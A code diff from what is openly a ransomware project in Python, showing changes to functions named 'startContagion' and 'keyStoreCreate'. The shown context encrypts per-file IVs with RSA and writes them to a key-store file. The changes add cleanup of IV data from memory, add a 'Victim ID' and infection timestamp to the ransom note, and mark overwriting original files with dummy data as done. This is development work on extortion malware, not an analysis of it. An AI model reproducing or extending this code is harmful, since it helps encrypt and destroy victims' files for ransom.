@@ -1,6 +1,7 @@
 import os
 import sys
 import base64
+import gc
 from queue import Queue
 
 import Utils
@@ -76,6 +77,8 @@ def startContagion(path):
                     fp = rsa_cipher.encrypt(fp.encode("utf-8")) # str -> bytes
                     fp = base64.b64encode(fp)
                     key_storing_file.write(iv + b":::::" + fp + b"\n")
+                    del iv
+                    # gc.collect()
 
     goodbye_files.join()
 
@@ -84,16 +87,17 @@ def startContagion(path):
 def keyStoreCreate():
 
     with open(Utils.aesIV_file_store_path,"w") as key_storing_file:
-        key_storing_file.write(Utils.who_we_are)
+        key_storing_file.write(Utils.who_we_are + Utils.version)
         key_storing_file.write(Utils.what_is_my_purpose)
+        key_storing_file.write("Your Victim ID : "+Utils.what_is_my_id)
+        key_storing_file.write("When did ransomware work : "+Utils.when_did_i_work)
         # and so on
     print("STORE FILE CREATED")
 
 def main():
     """
-    TODO:1 Multithread -> File Explorer and Encryption
-    TODO:2
-        re-write file with dummy data
+    TODO:1
+        re-write file with dummy data :: OK
         del <object>
         garbage collection
     """
